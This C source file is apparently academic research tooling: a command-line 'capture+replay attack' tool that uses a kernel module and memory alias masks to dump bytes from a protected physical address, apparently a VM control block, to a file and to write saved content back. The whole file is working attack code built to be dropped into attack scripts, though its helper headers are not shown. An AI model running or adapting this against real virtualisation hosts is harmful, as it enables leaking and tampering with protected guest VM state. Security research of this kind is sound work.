/**
 * Tool perform basic capture+replay attacks.
 * Two modes: DUMP and REPLAY
 * The interface is kept very generic, such that this
 * can easily be used as part of an attack script
*/

#include "kvm_ioctls.h"
#include "stdbool.h"

#include "mem_range_repo.h"
#include "proc_iomem_parser.h"
#include "helpers.h"
#include "readalias.h"
#include "readalias_ioctls.h"
#include <argp.h>
#include <stdio.h>
#include <unistd.h>

#include <openssl/sha.h>


enum main_mode {
	//not a valid mode
	MM_INVALID,
	MM_DUMP,
	MM_REPLAY,
	//not a valid mode
	MM_MAX,
};

//cli arguments
struct arguments {
	enum main_mode mode;
	uint64_t qemu_pid;
	char* alias_file_path;
	//Read/Write to this address, depening on mode
	uint64_t target_pa;
	//Amount of bytes to read/write, depending on mode
	uint64_t target_bytes;
	//For MM_REPLAY mode: seek to this offset in file
	//before copying data
	uint64_t file_offset;
	//For MM_DUMP: store data here. For MM_REPLAY: replay data from here
	//Must contain binary data
	char* file_path;

	//if true, perform the access via the alias
	bool use_alias;
};


/**
 * @brief pase string to enum main_mode
 @ @parameter c : string to parse
 * @returns MM_INVALID on error, else valid enum value
*/
enum main_mode main_mode_from_str(char* c) {
	if( 0 == memcmp(c, "DUMP", strlen("DUMP"))) {
		return MM_DUMP;
	} else if( 0 == memcmp(c, "REPLAY", strlen("REPLAY"))) {
		return MM_REPLAY;
	}
	return MM_INVALID;
}


struct app {
	struct arguments args;
	//memory ranges for which we have alias maks
  mem_range_t* mrs;
	//alias masks for corresponding mrs entry
  uint64_t* alias_masks;
	//length fo mrs (and alias_masks)
  size_t mrs_len;
};

#define SHA256_DIGEST_LENGTH 32

/**
 * Simple wrapper around OpenSSL API
*/
void sha256_hash(const uint8_t *input,size_t input_len, uint8_t *output) {
    SHA256_CTX ctx;
    SHA256_Init(&ctx);
    SHA256_Update(&ctx, input, input_len);
    SHA256_Final(output, &ctx);
}

/**
 * @brief Copies data from provided file to target address
*/
int write_to_target(struct app app) {
	
	FILE* f = NULL;
	uint8_t* buffer = NULL;
	page_stats_t stats;
	uint64_t target_pa = app.args.target_pa;
	size_t target_bytes = app.args.target_bytes;
	//depending to cli flag this is either the true pa or the alias
	uint64_t access_pa;


	//open file with replay content and load content into buffer
	f = fopen(app.args.file_path, "rb");
	if(!f) {
		err_log("failed to open file %s : %s\n", app.args.file_path, strerror(errno));
		goto error;
	}
	if(fseek(f, app.args.file_offset , SEEK_SET )) {
		err_log("failed to seek to offset 0x%jx : %s\n", app.args.file_offset, strerror(errno));
		goto error;
	}

	buffer = (uint8_t*)malloc(app.args.target_bytes);
	if( 1 != fread(buffer, target_bytes, 1, f)) {
		err_log("failed to 0x%jx bytes from %s starting at offset 0x%jx : %s\n",
		target_bytes, app.args.file_path, app.args.file_offset, strerror(errno));
		goto error;
	}
	

	//lookup alias if cli flag demands access via alias
	if(app.args.use_alias) {
		uint64_t alias_target_pa;
		if(get_alias(target_pa, app.mrs , app.alias_masks , app.mrs_len, &alias_target_pa)) {
			err_log("failed to get alias for target_pa 0x%jx\n", target_pa);
			goto error;
		}
		printf("target_pa\t\t0x%jx\nalias_target_pa\t0x%jx\n", target_pa, alias_target_pa);
		access_pa = alias_target_pa;
	} else {
		access_pa = target_pa;
	}

	//copy data to target memory
	if(wbinvd_ac()) {
		err_log("wbivnd failed\n");
		goto error;
	}
	if(memcpy_topa(access_pa, buffer, target_bytes , &stats , true)) {
		err_log("failed to copy to 0x%jx bytes to pa 0x%jx\n", target_bytes, access_pa);
		goto error;
	}
	if(wbinvd_ac()) {
		err_log("wbivnd failed\n");
		goto error;
	}


	int ret = 0;
	goto cleanup;
error:
	ret = -1;
cleanup:
	if(f) fclose(f);
	if(buffer) free(buffer);
	return ret;
}

/**
 * @brief Read data from target location and write it to file
*/
int dump_target(struct app app) {
	FILE* f = NULL;
	uint8_t* buffer = NULL;
	page_stats_t stats;
	uint64_t target_pa = app.args.target_pa;
	size_t target_bytes = app.args.target_bytes;
	//depending to cli flag this is either the true pa or the alias
	uint64_t access_pa;

	//lookup alias if cli flag demands access via alias
	if(app.args.use_alias) {
		uint64_t alias_target_pa;
		if(get_alias(target_pa, app.mrs , app.alias_masks , app.mrs_len, &alias_target_pa)) {
			err_log("failed to get alias for target_pa 0x%jx\n", target_pa);
			goto error;
		}
		printf("target_pa\t\t0x%jx\nalias_target_pa\t0x%jx\n", target_pa, alias_target_pa);
		access_pa = alias_target_pa;
	} else {
		access_pa = target_pa;
	}


	//copy data from target memory into buffer
	buffer = (uint8_t*)malloc(app.args.target_bytes);
	if(wbinvd_ac()) {
		err_log("wbivnd failed\n");
		goto error;
	}
	if(memcpy_frompa(buffer, access_pa, target_bytes , &stats , true)) {
		err_log("failed to read from tmr\n");
		goto error;
	}
	if(wbinvd_ac()) {
		err_log("wbivnd failed\n");
		goto error;
	}
	
	f = fopen(app.args.file_path,"wb");
	if(!f) {
		err_log("failed to create file %s : %s\n", app.args.file_path, strerror(errno));
		goto error;
	}
	if( 1 != fwrite(buffer, target_bytes , 1 , f )) {
		err_log("failed to write tmr content to file : %s", strerror(errno));
		goto error;
	}


	int ret = 0;
	goto cleanup;
error:
	ret = -1;
cleanup:
	if(f) fclose(f);
	if(buffer) free(buffer);
	return ret;
}



/**
 * @brief main function
 * @returns 0 on success
*/
int run(struct arguments args) {
  mem_range_t* mrs = NULL;
  uint64_t* alias_masks = NULL;
  size_t mrs_len;

	if(open_kmod() ) {
		err_log("failed to open readalias kernel module\n");
		goto error;
	}

  if( parse_csv(args.alias_file_path, &mrs, &alias_masks, &mrs_len) ) {
      err_log("failed to parse memory range and aliases from %s\n", args.alias_file_path);
      return -1;
  }

	struct app app = {
		.args = args,
		.mrs = mrs,
		.alias_masks = alias_masks,
		.mrs_len = mrs_len,
	};

	switch (app.args.mode) {

    case MM_DUMP:
			if(dump_target(app)) {
				err_log("mode dump failed\n");
				goto error;
			}
			break;
    case MM_REPLAY:
			if(write_to_target(app)) {
				err_log("mode replay failed\n");
				goto error;
			}
			break;
		default:
			err_log("invalid operation mode %d\n", app.args.mode);
			goto error;
  }

  int ret = 0;
	goto cleanup;
error:
	ret = -1;
cleanup:
	close_kmod();
	if(mrs) free(mrs);
	if(alias_masks) free(alias_masks);
	return ret;
}

const char* argp_program_version = "replay_vmcb";
const char* argp_program_bug_address = "l.wilke@uni-luebeck.de";
static char doc[] = "Replay VMCB content";
static char args_doc[] = " --mode <{DUMP,REPLAY}> --aliases <FILE PATH> --target-pa <HEX ADDR> --bytes <HEX> --file [--use-alias]  [--replay-file-offset]";
static struct argp_option options[] = {
	{"aliases", 1, "FILE", 0, "CSV file (same syntax as fai tool output) that specifies the memory ranges and alias functions\n", 0},
	{"target-pa", 2, "HEX ADDR", 0, "PA address that should be read/written", 0},
	{"bytes", 3, "HEX VALUE",0, "Amount of bytes to read/write", 0},
	{"file", 4, "FILE", 0, "Depending on mode read/write data from/to this file. Content must be binary", 0},
	{"use-alias", 5, 0, 0, "If true, perform access  to target-pa via its alias", 0},
	{"mode", 6, "OPERATION MODE", 0, "Main operation mode/subcommand", 0},
	{0}, //marks the end of the commands array
};


static error_t parse_opt(int key, char* arg, struct argp_state* state) {
	struct arguments* args = (struct arguments*)state->input;
	switch(key) {
		case 1:
			args->alias_file_path = arg;
			break;
		case 2:
			if(do_stroul(arg, 0 ,&(args->target_pa) )) {
				err_log("failed to parse target_pa \"%s\" to number\n", arg);
				return ARGP_ERR_UNKNOWN;
			}
			break;
		case 3:
			if(do_stroul(arg, 0 ,&(args->target_bytes) )) {
				err_log("failed to parse bytes \"%s\" to number\n", arg);
				return ARGP_ERR_UNKNOWN;
			}
			break;
		case 4:
			args->file_path = arg;
			break;
		case 5:
			args->use_alias = true;
			break;
		case 6: {
				enum main_mode m = main_mode_from_str(arg);
				if(m == MM_INVALID ) {
					err_log("invalid mode value \"%s\"", arg);
					return ARGP_ERR_UNKNOWN;
				}
				args->mode =m;
			}
			break;
		case ARGP_KEY_END:
			//check args that need to be present in all modes
			if( (args->alias_file_path == NULL) ||
				(args->target_pa == 0) ||
				(args->target_bytes ==0) ||
				(args->file_path == NULL) ||
				(args->mode == MM_INVALID)) {
				printf("Missing required options\n");
				argp_usage(state);
				return ARGP_ERR_UNKNOWN;
			}
			break;
		default:
			return ARGP_ERR_UNKNOWN;
	}
	return 0;
}

static struct argp argp = {
	options,
	parse_opt,
	args_doc,
	doc,
	0,
	0,
	0,
};

int main(int argc, char** argv) {
	struct arguments args = {0};
	args.mode = MM_INVALID;
	if(argp_parse(&argp, argc, argv, 0, 0, &args)) {
		printf("Failed to parse arguments\n");
		return -1;
	}
	return run(args);
}
